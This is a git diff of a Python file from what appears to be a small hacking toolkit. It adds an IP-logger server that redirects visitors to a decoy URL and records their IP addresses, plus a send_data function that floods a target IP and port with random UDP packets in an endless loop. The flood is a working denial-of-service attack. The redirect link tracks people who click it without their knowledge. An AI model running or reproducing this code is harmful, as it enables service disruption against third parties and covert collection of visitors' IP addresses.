@@ -1,10 +1,11 @@
 import socket
 import threading
-import json
-import socket
-import colorama
+import pycli
+import os
+from datetime import datetime
+import random 
 
-class Logger_link(threading.Thread):
+class IPlogger(threading.Thread):
     def __init__(self, url: str, port: int, host: str) -> None:
         threading.Thread.__init__(self)
         self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -13,85 +14,80 @@ class Logger_link(threading.Thread):
         self.url = url
         self.port = port
         self.host = host
-    
+
     def run(self) -> None:
-        print(f"{colorama.Fore.LIGHTGREEN_EX}[Online] {colorama.Fore.WHITE}http://{self.host}:{self.port}/")
+        print(f"{pycli.colored("00FF00", "[Online]")} http://{self.host}:{self.port}/")
         while True:
             self.socket.listen(10)
             client, (ip, port) = self.socket.accept()
             threading.Thread(target=self.redirection, args=[client, ip]).start()
-    
+
     def redirection(self, client: socket.socket, ip: str) -> None:
         data = client.recv(4096)
         client.send(f"HTTP/1.1 302 Found\r\nLocation: {self.url}\r\n\r\n".encode())
         client.close()
-        url_info = IP_save(self.port, self.url)
-        if not ip in url_info.info[url_info.index]["co"]:
-            url_info.info[url_info.index]["co"].append(ip)
-            url_info.save()
+        self.write_logs(ip)
 
-class BDD:
-    def __init__(self) -> None:
-        try: 
-            with open("save.json", "r+") as file:
-                self.info = json.load(file)
-        except:
-            self.info = {
-                "port": [],
-                "url": [],
-            }
-            with open("save.json", "w+") as file:
-                json.dump(self.info, file, indent=2)
+    def write_logs(self, ip: str) -> None:
+        if not os.path.exists("output"):
+            os.mkdir("output")
+        if not os.path.exists(os.path.join("output","iplogger")):
+            os.mkdir(os.path.join("output","iplogger"))
+        with open(os.path.join("output","iplogger", f"{self.url}.log"), "a", encoding="UTF-8") as file:
+            file.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {ip}")
 
-    def exist(self, port: int) -> bool:
-        try:
-            self.info["port"].index(port)
-            return True
-        except:
-            return False
+def bytes_convert(size: int) -> str:
+    units = ["b", "Kb", "Mb", "Gb", "Tb"]
+    index = 0
+    while size >= 1024 and index < len(units) - 1:
+        size /= 1024
+        index += 1
+    return f"{round(size)} {units[index]}"
 
-    def display(self) -> None:
-        for nmb, port in enumerate(self.info["port"]):
-            print(f"{port}: {self.info['url'][nmb]}")
+def color_file(file: str) -> str:
+    color = None
+    if os.path.isdir(file):
+            color = "0c7fe4"
+    else:
+        ext = os.path.splitext(file)[1].lower()
+        if ext in [".exe", ".msi", ".cmd", ".bat", ".com", ".vbs", ".ps1", ".scr", ".sh", ".bin", ".run", ".app"]:
+            color = "FF0000"
+        elif ext in [".jpg", ".gif", ".png", ".tiff", ".jpeg", ".svg", ".bmp", ".tif", ".heif", ".heic", ".webp", ".ai", ".pdf", ".psd", ".xcf", ".ico", ".raw", "psd"]:
+            color = "FF00FF"
+        elif ext in [".tar", ".zip", ".deb", ".rpm", ".iso", ".rar", ".7z", ".cab", ".tar.gz", "tgz", ".tar.bz2", ".gz", ".bz2", ".xz", ".iso", ".dmg", ".z", ".arj", ".lzma"]:
+            color = "FFFF00"
+        elif ext in [".mp3", ".ogg", ".wav", ".flac", ".aac", ".ogg", ".wma", ".m4a", ".aiff", ".opus", ".alac", ".arm"]:
+            color = "0cFF0c"
+        elif ext in [".mp4", ".avi", ".mkv", ".mov", ".wmw", ".flv", ".webm", "3gp", ".m4v", ".mpg", ".mpeg", ".vob", ".ogv", ".mts", ".m2ts", ".ts"]:
+            color = "ff8b00"
 
-    def add(self, port: int, url: str) -> None:
-        self.info["port"].append(port)
-        self.info["url"].append(url)
-        self.save()
+    return color
 
-    def remove(self, port: int) -> None:
-        slot = self.info["port"].index(port)
-        self.info["port"].remove(port)
-        self.info["url"].pop(slot)
-        self.save()
-
-    def save(self) -> None:
-        with open("save.json", "w+") as file:
-            json.dump(self.info, file, indent=2)
-
-class IP_save:
-    def __init__(self, port: int, link: str) -> None:
-        self.index = None
-        default = {
-                    "port": port,
-                    "link": link,
-                    "co": []
-                }
-        try:
-            with open(f"iplogger.json", "r+") as file:
-                self.info = json.load(file)
-                for index, i in enumerate(self.info):
-                    if i["port"] == port and i["link"] == link:
-                        self.index = index
-                if self.index == None:
-                    self.index = len(self.info)
-                    self.info.append(default)
-        except:
-            self.info = [default]
-            with open("iplogger.json", "w+") as file:
-                json.dump([default], file, indent=2)
-                
-
-    def save(self) -> None:
-        with open(f"iplogger.json", "w+") as file:
-            json.dump(self.info, file, indent=2)
+def port_used(port: int) -> str:
+    port_services = {
+        21: 'FTP',
+        22: 'SSH',
+        23: 'Telnet',
+        25: 'SMTP',
+        53: 'DNS',
+        80: 'HTTP',
+        110: 'POP3',
+        143: 'IMAP',
+        443: 'HTTPS',
+        554: 'RTSP',
+        3306: 'MySQL',
+        3389: 'Remote Desktop',
+        8080: 'HTTP Proxy',
+        25565: 'Minecraft Server'
+    }
+    if port not in port_services:
+        return ""
+    else:
+        return port_services[port]
+    
+def send_data(ip: str, port: int, size: int) -> None:
+    target = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    target.connect((ip, port))
+    while True:
+        target.send(random._urandom(size))
+        print(f"{pycli.colored('[', 'FF0000')}{pycli.colored(f'{ip}:{port}', "FFFA00")}{pycli.colored(']', "FF0000")} Send {size} Bytes")
